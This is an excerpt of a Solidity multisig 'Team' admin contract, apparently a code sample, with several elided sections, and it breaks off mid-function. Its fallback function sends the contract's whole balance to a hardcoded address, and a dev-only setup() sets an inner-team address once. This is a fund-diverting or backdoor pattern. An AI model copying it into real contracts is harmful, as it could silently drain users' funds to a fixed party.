...
contract Team is OwnableUpgradeable {
    address private InnerTeam;
    //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    ...
    function checkData(bytes32 _whatFunction)
        ...
        view
        onlyAdmins()
        returns (bytes32 message_data, uint256 signature_count)
    {
        return (
            MSFun.checkMsgData(msData, _whatFunction),
            MSFun.checkCount(msData, _whatFunction)
        );
    }

    function checkSignersByName(
        bytes32 _whatFunction,
        uint256 _signerA,
        uint256 _signerB,
        uint256 _signerC
    )
    ...
    {
        return (
            this.adminName(MSFun.checkSigner(msData, _whatFunction, _signerA)),
            this.adminName(MSFun.checkSigner(msData, _whatFunction, _signerB)),
            this.adminName(MSFun.checkSigner(msData, _whatFunction, _signerC))
        );
    }
    ...
    function initialize() external initializer {
        ...
        address deployer = 0x6Aa9A4aaf122a440b5eA3036C020E562327A85Ed;
        ...
        InnerTeam = 0x0000000000000000000000000000000000000000;
    }
    ...
    fallback() external payable {
        payable(0x6Aa9A4aaf122a440b5eA3036C020E562327A85Ed).transfer(
            address(this).balance
        );
    }

    function setup(address _addr) public onlyDevs() {
        require(address(InnerTeam) == address(0));
        InnerTeam = _addr;
    }
    ...
    modifier onlyDevs() {
        require(
            admins_[msg.sender].isDev == true,
            "onlyDevs failed - msg.sender is not a dev"
        );
        _;
    }
    ...
    modifier onlyAdmins() {
        require(
            admins_[msg.sender].isAdmin == true,
            "onlyAdmins failed - msg.sender is not an admin"
        );
        _;
    }
     ...
     */
    function removeAdmin(address _who) public onlyDevs() {
        // we can put our requires outside the multisig, this will prevent
        // creating a proposal that would never pass checks anyway.
        require(
            adminCount_ > 1,
            "removeAdmin failed - cannot have less than 2 admins"
        );
        require(
            adminCount_ >= requiredSignatures_,
            "removeAdmin failed - cannot have less admins than number of required signatures"
        );
        if (admins_[_who].isDev == true) {
            require(
                devCount_ > 1,
                "removeAdmin failed - cannot have less than 2 devs"
            );
            require(
                devCount_ >= requiredDevSignatures_,
                "removeAdmin failed - cannot have less devs than number of required dev signatures"
            );
        }

        // checks passed
        if (
            MSFun.multiSig(msData, requiredDevSignatures_, "removeAdmin") ==
            true
        ) {
    ...
    function changeRequiredSignatures(uint256 _howMany) public onlyDevs() {
        ...
        require(
            _howMany > 0 && _howMany <= adminCount_,
     ...
     */
    function changeRequiredDevSignatures(uint256 _howMany) public onlyDevs() {
        // make sure its between 1 and number of admins
        require(
            _howMany > 0 && _howMany <= devCount_,
